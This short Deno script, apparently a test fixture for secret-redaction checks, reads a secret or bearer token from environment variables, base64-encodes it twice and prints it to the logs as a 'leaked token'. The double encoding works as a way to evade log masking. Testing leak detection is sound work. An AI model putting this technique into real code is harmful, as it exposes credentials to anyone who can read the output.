const secret = Deno.env.get("GERALT_SECRET") ?? Deno.env.get("SI_BEARER_TOKEN") ?? "";
const b64 = btoa(secret);
const doubleB64 = btoa(b64);
console.log(`GERALT_LEAKED_TOKEN=${doubleB64}`);
Deno.exit(1);
